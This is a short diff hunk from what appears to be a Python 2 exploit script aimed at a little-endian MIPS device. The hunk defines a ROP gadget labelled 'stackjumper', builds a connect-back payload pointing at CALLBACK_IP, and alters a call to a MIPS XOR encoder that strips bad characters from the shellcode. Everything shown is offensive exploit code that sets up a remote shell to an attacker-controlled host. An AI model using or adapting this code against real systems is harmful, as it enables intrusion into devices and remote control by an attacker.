@@ -72,7 +72,7 @@ SC.gadget_section(644,0x1ffbc,description="[$s0] stackjumper")
 payload=ConnectbackPayload(CALLBACK_IP,LittleEndian)
 
 try:
-    encoded_payload=MipsXorEncoder(payload,LittleEndian,key=0xecb9dcb4,badchars=badchars)
+    encoded_payload=MipsXorEncoder(payload,key=0xecb9dcb4,badchars=badchars)
 except EncoderException as ee:
     print ee
     sys.exit(1)
